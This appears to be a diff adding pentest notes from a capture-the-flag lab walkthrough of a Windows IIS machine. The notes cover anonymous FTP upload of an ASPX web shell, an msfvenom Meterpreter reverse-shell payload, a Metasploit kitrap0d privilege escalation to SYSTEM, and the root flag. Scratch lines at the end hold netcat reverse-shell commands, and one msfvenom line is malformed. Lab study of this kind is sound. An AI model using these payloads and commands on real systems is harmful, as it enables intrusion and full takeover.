@@ -1,0 +1,374 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.10.5
+result:
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 127
+80/tcp open  http    syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 21,80 10.10.10.5
+result:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 07-06-23  10:23AM                33483 40564.c
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 07-06-23  04:08AM                 1442 cmd.aspx
+| 07-06-23  04:54PM                 1442 cmdasp.aspx
+| 03-17-17  05:37PM                  689 iisstart.htm
+| 07-06-23  04:34AM                 2938 met_rev_443.aspx
+| 07-06-23  05:10PM                59584 nc.exe
+| 07-06-23  08:46AM                 2778 reverse.aspx
+| 07-06-23  04:42PM                 1412 webshell.asp
+| 07-06-23  05:21PM                 2936 webshell.aspx
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows 7 (90%), Microsoft Windows Server 2008 R2 SP1 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+access: http://10.10.10.5/
+result:
+HTTP/1.1 304 Not Modified
+Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
+Accept-Ranges: bytes
+ETag: "37b5ed12c9fd21:0"
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date: Thu, 06 Jul 2023 14:51:23 GMT
+Connection: close
+
+command: locate cmd.aspx    
+/snap/seclists/34/Web-Shells/FuzzDB/cmd.aspx
+
+ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:donika-pentest): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put cmd.aspx
+local: cmd.aspx remote: cmd.aspx
+229 Entering Extended Passive Mode (|||49256|)
+125 Data connection already open; Transfer starting.
+100% |************************************|  1442       13.35 MiB/s    --:-- ETA
+226 Transfer complete.
+1442 bytes sent in 00:00 (12.24 KiB/s)
+
+access: http://10.10.10.5/cmd.aspx
+put whoami
+result:
+iis apppool\web
+
+let's create payload using msfvenom
+command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.19 LPORT=7979 -f aspx > met_rev_443.aspx
+
+ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:donika-pentest): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put met_rev_443.aspx 
+local: met_rev_443.aspx remote: met_rev_443.aspx
+229 Entering Extended Passive Mode (|||49257|)
+125 Data connection already open; Transfer starting.
+100% |************************************|  2925       22.49 MiB/s    --:-- ETA
+226 Transfer complete.
+2925 bytes sent in 00:00 (50.35 KiB/s)
+
+msf6 > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.10.16.19
+lhost => 10.10.16.19
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thre
+                                        ad, process, none)
+   LHOST     10.10.16.19      yes       The listen address (an interface may be
+                                         specified)
+   LPORT     443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > run
+
+[-] Handler failed to bind to 10.10.16.19:443:-  -
+[-] Handler failed to bind to 0.0.0.0:443:-  -
+[-] Exploit failed: Errno::EACCES Permission denied - bind(2) for 0.0.0.0:443
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > set lport 7979
+lport => 7979
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.19:7979 
+[*] Sending stage (175686 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.16.19:7979 -> 10.10.10.5:49258) at 2023-07-06 21:58:16 +0700
+
+let's we curl our payload
+command: curl http://10.10.10.5/met_rev_443.aspx
+
+meterpreter > getuid
+Server username: IIS APPPOOL\Web
+
+c:\windows\system32\inetsrv>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
+
+meterpreter> background
+privesc windows HKEY_LOCAL_MACHINE
+
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION          1                yes       The session to run this module o
+                                               n
+   SHOWDESCRIPTION  false            yes       Displays a detailed description
+                                               for the available exploits
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 185 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.10.5 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+ 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+ 14  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 15  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 16  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 17  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 18  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 19  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+ 20  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 21  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+ 22  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 23  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
+ 24  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+ 25  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+ 26  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 27  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 28  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
+ 29  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
+ 30  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
+ 31  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+ 32  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+ 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+ 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+ 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
+ 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
+ 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+ 41  exploit/windows/local/webexec                                  No                       The check raised an exception.
+
+[*] Post module execution completed
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms10_015_kitrap0d) > options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.105    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.16.19
+lhost => 10.10.16.19
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
+session => 1
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.16.19:4444 
+[*] Reflectively injecting payload and triggering the bug...
+[*] Launching msiexec to host the DLL...
+[+] Process 552 launched.
+[*] Reflectively injecting the DLL into 552...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175686 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (10.10.16.19:4444 -> 10.10.10.5:49260) at 2023-07-06 22:04:06 +0700
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 584 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>cd \users
+cd \users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users
+
+18/03/2017  02:16 ��    <DIR>          .
+18/03/2017  02:16 ��    <DIR>          ..
+18/03/2017  02:16 ��    <DIR>          Administrator
+17/03/2017  05:17 ��    <DIR>          babis
+18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
+06/07/2023  10:30 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   4.619.366.400 bytes free
+
+c:\Users>cd administrator
+cd administrator
+
+c:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Administrator
+
+18/03/2017  02:16 ��    <DIR>          .
+18/03/2017  02:16 ��    <DIR>          ..
+18/03/2017  02:16 ��    <DIR>          Contacts
+14/01/2021  12:42 ��    <DIR>          Desktop
+18/03/2017  02:16 ��    <DIR>          Documents
+18/03/2017  02:16 ��    <DIR>          Downloads
+18/03/2017  02:16 ��    <DIR>          Favorites
+18/03/2017  02:16 ��    <DIR>          Links
+18/03/2017  02:16 ��    <DIR>          Music
+18/03/2017  02:16 ��    <DIR>          Pictures
+18/03/2017  02:16 ��    <DIR>          Saved Games
+18/03/2017  02:16 ��    <DIR>          Searches
+18/03/2017  02:16 ��    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   4.619.366.400 bytes free
+
+c:\Users\Administrator>cd Desktop
+cd Desktop
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Administrator\Desktop
+
+14/01/2021  12:42 ��    <DIR>          .
+14/01/2021  12:42 ��    <DIR>          ..
+06/07/2023  03:59 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.619.366.400 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+ba8f311600fb394aad93db157c278451
+
+Dotnet compile Technique 
+dotnet restore
+dotnet publish --no-restore --runtime win7-x64 --self-contained false
+
+resource:
+https://0xdf.gitlab.io/2019/03/05/htb-devel.html
+
+\\10.10.14.14\share\nc.exe -e cmd.exe 10.10.14.14 443
+\\10.10.16.19\share\nc.exe -e cmd.exe 10.10.16.19 443
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met_rev_443.aspx
+msfvenom -o windows/meterpreter/reverse_tcp LHOST=10.10.16.19 LPORT=7979 -f aspc > met_rev_443.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.19 LPORT=443 -f aspx > met_rev_443.aspx
